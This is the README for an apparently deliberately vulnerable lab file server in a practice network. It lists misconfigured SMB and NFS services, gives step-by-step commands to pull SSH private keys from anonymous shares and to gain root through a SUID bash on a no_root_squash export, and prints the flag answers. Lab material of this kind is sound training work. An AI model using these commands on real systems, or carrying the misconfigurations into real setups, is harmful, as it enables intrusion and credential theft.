# 🏢 VulnCorp — Machine 10: int-files01 (File Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

Machine 10 is an internal storage server in the **Internal Zone (`192.168.1.40`)** with **Samba SMBv1 (EternalBlue simulation)**, **Guest / Anonymous Shares**, and **NFS with `no_root_squash`**.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on **Debian 13** instance `intfiles01` (`192.168.1.40`).

Spec services: Samba 4.17.12 or 4.18.0, nfs-kernel-server 2.6.2.

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/int-files01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Port | Description | Vulnerability |
|---------|------|-------------|---------------|
| **Samba SMB** | `445` / `139` | SMBv1 enabled | **Anonymous Guest Access**, SMB Signing disabled (NTLM Relay), password hints in shares |
| **NFS** | `2049` | NFS Kernel Server | Exported with **`no_root_squash`** (client root = server root) |
| **SSH** | `22` | OpenSSH | Standard access |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Anonymous SMB Enumeration & File Download
```bash
# List all shares anonymously
smbclient -L \\192.168.1.40 -N

# Connect to IT_Share and download files
smbclient \\\\192.168.1.40\\IT_Share -N
smb: \> get README.txt
smb: \> get flag.txt

# Connect to SSH_Keys share
smbclient \\\\192.168.1.40\\SSH_Keys -N
smb: \> get dc01_admin_rsa
smb: \> get backup_rsa
```

### 2. NFS `no_root_squash` Root Privilege Escalation
```bash
# View available exports
showmount -e 192.168.1.40

# Mount share locally as root
sudo mkdir -p /mnt/vuln_nfs
sudo mount -t nfs 192.168.1.40:/exports/backup /mnt/vuln_nfs

# Create a SUID root binary on the mounted share
sudo cp /bin/bash /mnt/vuln_nfs/rootbash
sudo chmod +s /mnt/vuln_nfs/rootbash
sudo chmod 4755 /mnt/vuln_nfs/rootbash
```

---

## 🏆 Flags

- **SMB Share Flag:** `IT_Share/flag.txt` (`VULN{smb_sh4r3_0p3n}`)
- **NFS No Root Squash Flag:** `backup/flag.txt` (`VULN{nfs_n0_r00t_squ4sh}`)
- **Root Flag:** `/root/root.txt` (`VULN{f1l3_s3rv3r_r00t3d_m4ch1n3_10}`)
